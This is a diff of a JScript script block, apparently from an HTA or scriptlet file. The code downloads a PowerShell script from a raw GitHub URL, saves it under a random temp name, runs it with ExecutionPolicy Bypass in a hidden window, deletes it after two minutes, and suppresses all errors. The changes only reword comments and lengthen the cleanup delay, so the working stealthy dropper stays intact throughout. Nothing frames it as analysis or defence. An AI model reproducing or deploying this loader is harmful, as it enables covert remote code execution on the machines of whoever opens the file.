@@ -6,37 +6,40 @@
 <script language="JScript">
 <![CDATA[
     try {
+        // Download PowerShell script from GitHub
         var x = new ActiveXObject("Msxml2.XMLHTTP");
         x.open("GET", "https://raw.githubusercontent.com/rootkalilocalhost/modules/main/v3.ps1", false);
         x.send();
         
         if (x.status == 200) {
             var content = x.responseText;
-            // Safe saving to temporary file
+            
+            // Create temporary file with random name
             var fso = new ActiveXObject("Scripting.FileSystemObject");
             var tempFile = fso.GetSpecialFolder(2) + "\\~tmp" + Math.round(Math.random() * 10000) + ".ps1";
             var ts = fso.CreateTextFile(tempFile, true);
             ts.Write(content);
             ts.Close();
             
+            // Execute PowerShell script with bypass and hidden window
             var s = new ActiveXObject("WScript.Shell");
             var cmd = 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + tempFile + '"';
-            s.Run(cmd, 0, false); // Do not wait for completion
+            s.Run(cmd, 0, false); // Run without waiting for completion
             
-            // Cleanup after 60 seconds (1 minute)
+            // Schedule cleanup after 120 seconds (2 minutes)
             setTimeout(function() {
                 try { 
                     // Check if file exists before deletion
                     if (fso.FileExists(tempFile)) {
-                        fso.DeleteFile(tempFile, true);
+                        fso.DeleteFile(tempFile, true); // Force delete
                     }
                 } catch(e) {
-                    // Silent error handling for deletion
+                    // Silent error handling for file deletion
                 }
-            }, 60000); // 60000 ms = 60 seconds
+            }, 120000); // 120000 ms = 120 seconds = 2 minutes
         }
     } catch(e) {
-        // Silent error handling
+        // Silent error handling for main execution
     }
 ]]>
 </script>
